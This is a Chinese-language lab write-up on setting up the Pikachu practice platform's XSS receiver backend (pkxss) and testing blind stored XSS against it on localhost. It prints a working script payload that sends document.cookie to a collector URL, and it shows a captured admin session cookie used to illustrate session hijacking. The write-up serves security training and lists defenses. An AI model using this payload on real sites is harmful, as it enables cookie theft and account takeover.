【Pikachu】Web-XSS后台 Writeup

操作者：何芊宏 | 操作日期：2026.10.01 | 分类：Pikachu | 标签：Pikachu, Web, XSS后台, 数据外带

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：管理工具 - XSS后台
  • 题目名称：XSS后台
  • 目标：理解并利用 Pikachu 提供的 XSS 管理后台，将其作为攻击者控制的数据接收端，验证 XSS 盲打漏洞中数据外带与存储的完整链路。

2. 解题思路与知识点

XSS后台的实战价值：

在真实的 XSS 攻击（特别是盲打）中，攻击者无法直接在受害者浏览器中看到执行结果。因此，攻击者需要在服务器端搭建一个“接收后台”。Pikachu 的“管理工具”中内置了这样一个简易的 XSS 后台（pkxss），用于模拟攻击者的指挥中心。

XSS后台的三大核心功能模块：
  • cookie搜集：接收并展示目标浏览器发送过来的 Cookie（包含敏感登录凭证）。
  • 钓鱼结果：展示通过伪造登录框诱导受害者提交的账号密码。
  • 键盘记录：展示通过 JS 记录下的受害者在页面上的按键内容。

3. 操作步骤

第一步：初始化攻击者后台环境

操作： 访问左侧菜单的“管理工具” -> “XSS后台”。

回显： 提示 Warning: mysqli_connect(): (HY000/1049): Unknown database 'pkxss'。

解决： 访问 http://127.0.0.1/pikachu/pkxss/pkxss_install.php，点击“安装/初始化”按钮，自动创建 pkxss 数据库及 cookie、fish、users 等表。

验证： 返回后台登录页面 http://127.0.0.1/pikachu/pkxss/xssmanager.php，使用 admin / 123456 成功登录，看到后台管理界面。

第二步：生成测试数据（注入与触发 Payload）

操作 1（注入）： 访问留言板 http://127.0.0.1/pikachu/vul/xss/xssblind/xss_blind.php，提交以下 Payload：

<script>new Image().src="http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie="+document.cookie;</script>

操作 2（触发）： 以管理员身份登录 admin_login.php，随后访问 admin.php 查看留言。此时浏览器会静默执行 Payload，将当前页面的 Cookie 发送给 XSS 后台。

第三步：在 XSS 后台查看战果

操作： 回到 XSS 后台 http://127.0.0.1/pikachu/pkxss/xssmanager.php，点击左侧的 cookie搜集。

初次回显： 页面刷新后，没有任何记录（呈现空白状态）。

后续处理： 在发现无数据后，关闭了靶场和电脑，去吃饭休息。

重启后回显： 重新开机启动 PHPStudy 后，再次访问 XSS 后台并点击 cookie搜集。此时页面成功显示 4 条记录，时间戳为 2026-10-01 06:10:49 等。字段内容如下：

  • time：2026-10-01 06:10:49 等时间戳。
  • ipaddress：127.0.0.1
  • cookie：ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=o5hdto1uddip93svk7o8up86k7;
  • referer：http://127.0.0.1/pikachu/vul/xss/xssblind/admin.php
  • useragent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...

结论： XSS 后台成功接收并存储了受害者的敏感信息。攻击者已经可以通过窃取到的 PHPSESSID 实现会话劫持。虽然数据在重启后才显示，但完整的数据外带链路已验证成功。

Payload 代码组成

  • <script> ... </script>：HTML 脚本标签，使内部代码被浏览器解析并执行。
  • new Image()：创建一个新的图片对象（这种技巧不会改变页面视觉）。
  • .src=：设置图片对象的源地址，强制浏览器发起 GET 请求。
  • "http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie="：XSS 后台接收数据的 URL 接口。
  • +document.cookie：获取当前页面的 Cookie，拼接在 URL 参数后面发送。

4. 踩坑记录与复盘

  • 坑1：后台数据库缺失导致报错。初次访问 XSS 后台时报错 Unknown database 'pkxss'。
    原因： 靶场部署时未执行后台数据库的初始化。
    解决： 通过访问 pkxss_install.php 脚本自动完成建库建表，还原了接收端环境。

5. 知识总结

  • 核心逻辑：XSS 后台是攻击者接收和存储盲打数据的“大本营”。通过完整的注入（留言板）-> 触发（管理员审核）-> 接收（XSS后台）链路，实现了对高权限用户的会话劫持。
  • 防御措施：对用户输入进行 HTML 实体编码；设置 Cookie 的 HttpOnly 属性，禁止 JS 读取 Cookie；后台渲染用户数据时进行上下文输出编码。
  • 实战启发：在进行盲打漏洞测试时，必须事先搭建好接收端（如 Pikachu 的 XSS 后台）。监测后台是否收到数据，是判断漏洞是否被成功触发的唯一标准。同时，要考虑到真实环境中存在的数据库延迟和缓存机制。
